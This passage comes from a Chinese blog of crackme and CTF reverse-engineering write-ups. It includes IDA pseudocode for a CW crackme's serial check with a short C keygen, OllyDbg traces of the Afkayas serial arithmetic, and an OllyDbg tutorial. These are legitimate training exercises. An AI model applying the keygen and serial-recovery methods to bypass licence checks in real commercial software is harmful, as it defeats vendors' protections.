EAX的值先是被保存到了dword_431750，后又在0x42FAC8处赋值给EAX；</p><ul><li>abcds是输入的用户名name；</li><li>0x61十进制为97，是a的ascii码；</li><li>0xF89十进制为3977，3977除以97的值为41，之,3977还要再乘以2；</li><li>0x1F12十进制为7954，3977*2的结果；</li><li>注意到7954和序列号‘CW-7954-CRACKED’中的数字部分一样；</li></ul><p>计算规则是：首字符的ascii码值*41*2？</p><p>我们在IDA中查看伪代码，验证我们分析到的规则：找到了dword_431750的值确实为41，并且找到了乘积运算，不仅如此，我们还发现str_CW和str_CRACKED以及str__(下划线),</p><p>说明我们分析的规则是正确的。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019935.png" alt="image-20220926110804490" style="zoom:80%;" /><h3 id="附伪代码">附：伪代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 按钮点击事件的函数完整伪代码</span></span><br><span class="line"><span class="comment">// 参数a1是EAX的值，也就是用户名，</span></span><br><span class="line"><span class="type">int</span> __usercall TNS_BitBtn1Click@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;ebx&gt;, <span class="type">int</span> a3@&lt;esi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp-14h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *v10; <span class="comment">// [esp-10h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> *v11; <span class="comment">// [esp-Ch] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp-8h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp-4h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> *v16; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line">  <span class="type">int</span> savedregs; <span class="comment">// [esp+18h] [ebp+0h]</span></span><br><span class="line"></span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v13 = a2;</span><br><span class="line">  v12 = a3;</span><br><span class="line">  v3 = a1;</span><br><span class="line">  v11 = &amp;savedregs;</span><br><span class="line">  v10 = &amp;loc_42FB67;</span><br><span class="line">  v9 = __readfsdword(<span class="number">0</span>);</span><br><span class="line">  __writefsdword(<span class="number">0</span>, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v9);</span><br><span class="line">  dword_431750 = <span class="number">0x29</span>; <span class="comment">// 41</span></span><br><span class="line">  sub_41AA58(*(_DWORD *)(a1 + <span class="number">476</span>), &amp;v16);<span class="comment">// v16的值</span></span><br><span class="line">  dword_43176C = sub_403AB0(v16);<span class="comment">// 用户名长度</span></span><br><span class="line">  sub_41AA58(*(_DWORD *)(v3 + <span class="number">476</span>), &amp;v16);</span><br><span class="line">  v4 = <span class="number">7</span> * *(<span class="type">unsigned</span> __int8 *)v16;</span><br><span class="line">  sub_41AA58(*(_DWORD *)(v3 + <span class="number">0x1DC</span>), &amp;v15);</span><br><span class="line">  dword_431754 = <span class="number">16</span> * *(<span class="type">unsigned</span> __int8 *)(v15 + <span class="number">1</span>) + v4;</span><br><span class="line">  sub_41AA58(*(_DWORD *)(v3 + <span class="number">0x1DC</span>), &amp;v16);</span><br><span class="line">  v5 = <span class="number">11</span> * *((<span class="type">unsigned</span> __int8 *)v16 + <span class="number">3</span>);</span><br><span class="line">  sub_41AA58(*(_DWORD *)(v3 + <span class="number">0x1DC</span>), &amp;v15);</span><br><span class="line">  dword_431758 = <span class="number">14</span> * *(<span class="type">unsigned</span> __int8 *)(v15 + <span class="number">2</span>) + v5;</span><br><span class="line">  <span class="keyword">if</span> ( sub_406930(dword_43176C) &gt;= <span class="number">4</span> )<span class="comment">// 比较用户名长度</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_41AA58(*(_DWORD *)(v3 + <span class="number">476</span>), &amp;v16);</span><br><span class="line">    dword_431750 *= *(<span class="type">unsigned</span> __int8 *)v16;<span class="comment">//乘以v16</span></span><br><span class="line">    dword_431750 *= <span class="number">2</span>; <span class="comment">//乘以2</span></span><br><span class="line">    sub_403708(&amp;v19, &amp;str_CW[<span class="number">1</span>]);</span><br><span class="line">    sub_403708(&amp;v18, &amp;str_CRACKED[<span class="number">1</span>]);</span><br><span class="line">    sub_406718();</span><br><span class="line">    sub_4039AC(&amp;v17, <span class="number">5</span>, v6, &amp;str___0[<span class="number">1</span>], v14, &amp;str___0[<span class="number">1</span>], v18);</span><br><span class="line">    sub_41AA58(*(_DWORD *)(v3 + <span class="number">480</span>), &amp;v16);</span><br><span class="line">    sub_4039FC(v17, v16);</span><br><span class="line">    <span class="keyword">if</span> ( v7 ) </span><br><span class="line">      sub_42A170(*off_430A48, <span class="string">&quot;Good job dude =)&quot;</span>, <span class="string">&quot;Congratz !!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_42A170(*off_430A48, <span class="string">&quot;Sorry , The serial is incorect !&quot;</span>, <span class="string">&quot;Try Again!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_42A170(*off_430A48, <span class="string">&quot;Sorry , The serial is incorect !&quot;</span>, <span class="string">&quot;Try Again!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  __writefsdword(<span class="number">0</span>, v9);</span><br><span class="line">  v11 = (<span class="type">int</span> *)&amp;loc_42FB6E;</span><br><span class="line">  sub_403670(&amp;v14);</span><br><span class="line">  sub_403694(&amp;v15, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_403694(&amp;v17, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261019060.png" alt="image-20220925210312090"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Decryption</span><span class="params">(<span class="type">char</span>* mima)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> szBuff[<span class="number">260</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> data = (<span class="type">unsigned</span> <span class="type">long</span>)mima[<span class="number">0</span>];</span><br><span class="line">    data *= <span class="number">0X29</span>;</span><br><span class="line">    data *= <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(szBuff, <span class="string">&quot;CW-%d-CRACKED&quot;</span>, data);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s \r\n&quot;</span>, szBuff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终结果为CW-s-CRACKED</p><p>s为用户名的第一个字符的ascii码值*0x29*2</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.Afkayas1</title>
      <link href="/2023/12/18/Security/binary/reverse/2.Afkayas1/"/>
      <url>/2023/12/18/Security/binary/reverse/2.Afkayas1/</url>
      
        <content type="html"><![CDATA[<h2 id="2afkayas1">2.Afkayas1</h2><p>运行程序，崩溃，缺少msvbvm50.dll，程序无法运行。没办法，上网上搜索一个，放到程序同一级目录，再次运行，OK。</p><p>输入name和serial，</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261021588.png" alt="image-20220926140405955" style="zoom:80%;" /><p>弹出对话框，不要点击确定也不要关闭，我们去堆栈查看调用，MsgBox的位置，显示调用；</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261021129.png" alt="image-20220926140255033"></p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261021326.png" alt="image-20220926144042664" style="zoom:80%;" /><p>可以看到，再往上面一点就看到可读的字符串了，程序的主要逻辑就在这附近。</p><p>断点调试，可以发现序列号AKA-585291</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261021193.png" alt="image-20220926144641206" style="zoom:80%;" /><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261021385.png" alt="image-20220926144708880" style="zoom:80%;" /><p>此位置，ECX获得了用户名，</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261021729.png" alt="image-20220926145756554"></p><p>0x8EE4B就是585291，计算过程是</p><p>加上前缀AKA-</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261021939.png" alt="image-20220926150856415"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261021117.png" alt="image-20220926152139460"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OD介绍以及使用</title>
      <link href="/2023/12/18/Security/binary/reverse/OD%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/12/18/Security/binary/reverse/OD%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>OllyDbg</strong>是一个<code>32位</code>的<strong>动态调试器</strong>，在平常做逆向的题中用的比较多，下面用bugku一个简单的例子Eazy-Re来介绍一下<strong>OllyDbg</strong>的使用。</p><p>首先打开程序，看一下是干什么的，他提示你输入flag，这里我随便输入几个字母，提示我不正确。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261015775.jpg" alt="img"></p><p>我们用OD打开程序，会看到下面的这个样子，如果没接触过OD的人可能直接被劝退了，这是啥乱七八糟的，别急，一点点来看，打开程序后会出现<strong>5个面板</strong>（我更喜欢称之为窗口），分别是反汇编窗口，信息窗口，寄存器窗口，数据窗口，栈窗口。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261015109.jpg" alt="img"></p><ul><li><p><strong>反汇编窗口</strong><br>反汇编窗口显示被调试程序的代码，总共有4列，分别是地址，十六进制的机器码，反汇编代码和注释。在最后一列注释中显示了相关API参数或运行简表，非常有用。<br>在反汇编窗口的列中，默认情况下，双击可以完成如下操作：</p></li><li><ul><li>地址列：显示被双击行地址的相对地址，再次双击返回标准地址模式</li><li>十六进制机器码列：<strong>设置或取消断点</strong>，对应的快捷键是<code>F2</code></li><li>反汇编代码列：调用汇编器，可以直接<strong>修改汇编代码</strong>，对应的快捷键是<code>空格键</code>。</li><li>注释列：允许<strong>增加或编辑注释</strong>，对应的快捷键是<code>;</code>。</li></ul></li><li><p><strong>信息窗口</strong><br>在进行动态跟踪时，信息窗口将显示与指令相关的各寄存器的值、API函数调用提示和跳转提示等信息。</p></li><li><p><strong>数据窗口</strong><br>数据窗口以十六进制和字符方式显示文件在内存中的数据。要查看指定位置的数据，可以使用快捷键<strong>Ctrl+G</strong>，输入地址，进行跳转。</p></li><li><p><strong>寄存器窗口</strong><br>寄存器窗口显示CPU各寄存器的值，支持浮点、MMX和3DNow!寄存器。可以单击右键或窗口标题切换显示寄存器的方式。</p></li><li><p><strong>栈窗口</strong><br>栈窗口显示栈的内容，即ESP指向地址的内容。栈窗口非常重要，各API函数和子程序都利用它传递参数和变量等。</p></li></ul><p>介绍完各个窗口后开始进行分析这道题，在一开始运行这个程序的时候，他有一些提示字符，忘记的可以翻回去看看，我们<code>在反汇编窗口的空白处右击--&gt;中文搜索引擎--&gt;搜索ASCII</code>，可以查看程序中出现的字符，然后<code>Ctrl+F</code>搜索你之前看到的提示字符（或者部分提示字符），比如这里我搜的是’flag’，就找到了提示字符的部分，然后上下翻一翻有什么其他值得注意的字符，就看到了真正的flag，这道题到这里就结束了，但是为了介绍OD的使用，我们继续往下分析。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261015451.jpg" alt="img"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261015019.jpg" alt="img"></p><p>我们假设没看到flag，但我们看到了<strong>关于正确或者错误的提示</strong>，比如我们一开始随便输入了几个a，提示的是“flag不太对……”，我们双击跟进去，找到对应反汇编代码的位置。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261015064.jpg" alt="img"></p><p>可以看到，提示正确和错误的位置距离不远，并且可以看到一个有一个<code>jnz</code>判断，跳转到提示错误的地方（在十六进制列有一个红色的箭头）。我们在这个判断<strong>下个断点</strong>，快捷键<code>F2</code>。</p><p>然后运行程序，注意刚才我们只是打开了一个程序，也就是加载了程序，并没有<strong>运行它</strong>，可以看到左上角有个黄底红字提示我们是<strong>暂停状态</strong>。我们可以通过<code>调试-&gt;运行</code>或者快捷键<code>F9</code>来运行程序，也可以用快捷图标（那个红色的三角）来运行。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261015246.jpg" alt="img"></p><p>注意看，左上角已经变成<strong>运行</strong>了，而且程序给出正常提示，如果想<strong>让光标回到当前EIP所指向的语句</strong>，<code>双击右边寄存器窗口中的EIP</code>就可以了。</p><p>我们还是输入一下有特征的字符串，方便我们跟踪，比如还是几个a，然后回车，发现程序到达我们的断点了。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261015053.jpg" alt="img"></p><p>首先可以看到信息栏提示<strong>跳转已实现</strong>，依旧是说我们的输入错了，然后看右边寄存器发现了真正的flag，为什么，因为比较的时候会将你输入的字符串和真正的flag放在寄存器中。</p><p>我们把断点下在前面一点的位置，比如<code>0x47105F</code>这个地址。然后重新运行程序，快捷键<code>Ctrl+F2</code>，或者点快捷图标，X左边的那个双三角。重新输入aaaaaaa，回车，程序运行到断点位置。然后<code>F8</code>单步执行。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261015174.jpg" alt="img"></p><p>根据信息窗口我们知道他把我们<strong>输入的字符串地址</strong>放在了<code>eax</code>寄存器中，继续单步执行</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261015804.jpg" alt="img"></p><p>可以看到寄存器窗口已经有了我们的输入，同理，下面的命令是把<strong>真正的flag地址</strong>放入<code>ecx</code>中，然后进行一些比较。</p><p>下面是一些<strong>常用快捷键的总结</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261015385.jpg" alt="img"></p><p><strong>使用OD分析程序的一般步骤</strong>：找特殊字符串或者API，下断点，运行，跟踪调试。当然如果对汇编不熟悉的话可能分析很费劲，可以与静态分析工具IDA pro一起结合使用。IDA pro的使用介绍可以参考<a href="https://link.zhihu.com/?target=https%3A//blog.csdn.net/Casuall/article/details/100191563">通过一个例子来介绍IDA的简单使用</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.Afkayas2</title>
      <link href="/2023/12/18/Security/binary/reverse/3.Afkayas2/"/>
      <url>/2023/12/18/Security/binary/reverse/3.Afkayas2/</url>
      
        <content type="html"><![CDATA[<h2 id="3afkayas2">3.Afkayas2</h2><p>同1时类似，依旧是找到MsgBox函数，右键显示调用；</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261020321.png" alt="image-20220926154437328"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261020993.png" alt="image-20220926154612946"></p><p>找到的序列号为1600318，完全没有章法；</p><p>直接单步运行，记录寄存器变化；</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261020144.png" alt="image-20220926160355015" style="zoom:80%;" /><p>用户名：itachi，长度6，第一个字符ascii码为0x69，</p><p>第一次计算：len(s)*0x15B38 + ascii(first(s))，值为533433</p><p>533433-&gt; 533435-&gt;1600303-&gt;1600318</p><p>第一次浮点计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">004082D7   .  FF15 18B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</span><br><span class="line">004082DD   &gt;  8B8D 58FFFFFF mov ecx,dword ptr ss:[ebp-0xA8]</span><br><span class="line">004082E3   .  8B55 E8       mov edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004082E6   .  52            push edx                                 ;  // edx=355603</span><br><span class="line">004082E7   .  8B19          mov ebx,dword ptr ds:[ecx]</span><br><span class="line">004082E9   .  FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  msvbvm50.__vbaR8Str</span><br><span class="line">004082EF   .  D905 08104000 fld dword ptr ds:[0x401008]              ;  // 10.0</span><br><span class="line">004082F5   .  833D 00904000&gt;cmp dword ptr ds:[0x409000],0x0</span><br><span class="line">004082FC   .  75 08         jnz short 00408306</span><br><span class="line">004082FE   .  D835 0C104000 fdiv dword ptr ds:[0x40100C]             ;  // 5.0, 做除法==2。0</span><br><span class="line">00408304   .  EB 0B         jmp short 00408311</span><br><span class="line">00408306   &gt;  FF35 0C104000 push dword ptr ds:[0x40100C]</span><br><span class="line">0040830C   .  E8 578DFFFF   call &lt;jmp.&amp;MSVBVM50._adj_fdiv_m32&gt;</span><br><span class="line">00408311   &gt;  83EC 08       sub esp,0x8</span><br><span class="line">00408314   .  DFE0          fstsw ax                                 ;  // 将值给eax=3100</span><br><span class="line">00408316   .  A8 0D         test al,0xD</span><br><span class="line">00408318   .  0F85 A1040000 jnz 004087BF</span><br><span class="line">0040831E   .  DEC1          faddp st(1),st                           ;  // 加法，355603 + 2</span><br><span class="line">00408320   .  DFE0          fstsw ax</span><br><span class="line">00408322   .  A8 0D         test al,0xD</span><br><span class="line">00408324   .  0F85 95040000 jnz 004087BF</span><br><span class="line">0040832A   .  DD1C24        fstp qword ptr ss:[esp]</span><br><span class="line">0040832D   .  FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;;  msvbvm50.__vbaStrR8</span><br><span class="line">00408333   .  8BD0          mov edx,eax                              ;  // eax = 355605 字符串</span><br><span class="line">00408335   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">00408338   .  FF15 94B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMo&gt;;  msvbvm50.__vbaStrMove</span><br><span class="line">0040833E   .  899D 34FFFFFF mov dword ptr ss:[ebp-0xCC],ebx</span><br><span class="line">00408344   .  8B9D 58FFFFFF mov ebx,dword ptr ss:[ebp-0xA8]</span><br><span class="line">0040834A   .  50            push eax</span><br><span class="line">0040834B   .  8B85 34FFFFFF mov eax,dword ptr ss:[ebp-0xCC]          ;  // 355605</span><br><span class="line">00408351   .  53            push ebx</span><br><span class="line">00408352   .  FF90 A4000000 call dword ptr ds:[eax+0xA4]</span><br><span class="line">00408358   .  85C0          test eax,eax                             ;  // eax=0,ecx=&quot; &quot;</span><br><span class="line">0040835A   .  7D 12         jge short 0040836E</span><br></pre></td></tr></table></figure><p>第二次浮点计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">004083E3   .  FF15 18B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</span><br><span class="line">004083E9   &gt;  8B8D 58FFFFFF mov ecx,dword ptr ss:[ebp-0xA8]</span><br><span class="line">004083EF   .  8B55 E8       mov edx,dword ptr ss:[ebp-0x18]         ;  // 355605</span><br><span class="line">004083F2   .  52            push edx</span><br><span class="line">004083F3   .  8B19          mov ebx,dword ptr ds:[ecx]</span><br><span class="line">004083F5   .  FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  msvbvm50.__vbaR8Str</span><br><span class="line">004083FB   .  DC0D 10104000 fmul qword ptr ds:[0x401010]            ;  // 355605 * 3 = 1066815.0</span><br><span class="line">00408401   .  83EC 08       sub esp,0x8</span><br><span class="line">00408404   .  DC25 18104000 fsub qword ptr ds:[0x401018]            ;  // 1066815 - 2 = 1066813</span><br><span class="line">0040840A   .  DFE0          fstsw ax                                ;  // ax = 3900</span><br><span class="line">0040840C   .  A8 0D         test al,0xD</span><br><span class="line">0040840E   .  0F85 AB030000 jnz 004087BF</span><br><span class="line">00408414   .  DD1C24        fstp qword ptr ss:[esp]</span><br><span class="line">00408417   .  FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;;  msvbvm50.__vbaStrR8</span><br><span class="line">0040841D   .  8BD0          mov edx,eax                             ;  // eax=1600133</span><br><span class="line">0040841F   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">00408422   .  FF15 94B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMo&gt;;  msvbvm50.__vbaStrMove</span><br><span class="line">00408428   .  899D 2CFFFFFF mov dword ptr ss:[ebp-0xD4],ebx</span><br><span class="line">0040842E   .  8B9D 58FFFFFF mov ebx,dword ptr ss:[ebp-0xA8]</span><br><span class="line">00408434   .  50            push eax                                ;  1066813</span><br><span class="line">00408435   .  8B85 2CFFFFFF mov eax,dword ptr ss:[ebp-0xD4]</span><br><span class="line">0040843B   .  53            push ebx</span><br><span class="line">0040843C   .  FF90 A4000000 call dword ptr ds:[eax+0xA4]</span><br><span class="line">00408442   .  85C0          test eax,eax</span><br><span class="line">00408444   .  7D 12         jge short 00408458</span><br></pre></td></tr></table></figure><p>第三次浮点计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">004084CD   .  FF15 18B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</span><br><span class="line">004084D3   &gt;  8B8D 58FFFFFF mov ecx,dword ptr ss:[ebp-0xA8]</span><br><span class="line">004084D9   .  8B55 E8       mov edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004084DC   .  52            push edx</span><br><span class="line">004084DD   .  8B19          mov ebx,dword ptr ds:[ecx]</span><br><span class="line">004084DF   .  FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  msvbvm50.__vbaR8Str</span><br><span class="line">004084E5   .  DC25 20104000 fsub qword ptr ds:[0x401020]             ;  // 1066813.0 - (-15.0) = 1066828</span><br><span class="line">004084EB   .  83EC 08       sub esp,0x8</span><br><span class="line">004084EE   .  DFE0          fstsw ax</span><br><span class="line">004084F0   .  A8 0D         test al,0xD</span><br><span class="line">004084F2   .  0F85 C7020000 jnz 004087BF</span><br><span class="line">004084F8   .  DD1C24        fstp qword ptr ss:[esp]</span><br><span class="line">004084FB   .  FF15 48B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;;  msvbvm50.__vbaStrR8</span><br><span class="line">00408501   .  8BD0          mov edx,eax                              ;  // 1066828</span><br><span class="line">00408503   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">00408506   .  FF15 94B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMo&gt;;  msvbvm50.__vbaStrMove</span><br></pre></td></tr></table></figure><p>Serial</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">004085C8   .  FF15 18B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</span><br><span class="line">004085CE   &gt;  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]</span><br><span class="line">004085D1   .  50            push eax                                 ;  // 获取Serial</span><br><span class="line">004085D2   .  FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  msvbvm50.__vbaR8Str</span><br><span class="line">004085D8   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]          ;  // 1066828</span><br><span class="line">004085DB   .  DD9D 1CFFFFFF fstp qword ptr ss:[ebp-0xE4]</span><br><span class="line">004085E1   .  51            push ecx</span><br><span class="line">004085E2   .  FF15 74B14000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  msvbvm50.__vbaR8Str</span><br><span class="line">004085E8   .  833D 00904000&gt;cmp dword ptr ds:[0x409000],0x0</span><br><span class="line">004085EF   .  75 08         jnz short 004085F9</span><br><span class="line">004085F1   .  DCBD 1CFFFFFF fdivr qword ptr ss:[ebp-0xE4]            ;  // 做除法</span><br><span class="line">004085F7   .  EB 11         jmp short 0040860A</span><br><span class="line">004085F9   &gt; \FFB5 20FFFFFF push dword ptr ss:[ebp-0xE0]</span><br><span class="line">004085FF   .  FFB5 1CFFFFFF push dword ptr ss:[ebp-0xE4]</span><br><span class="line">00408605   .  E8 888AFFFF   call 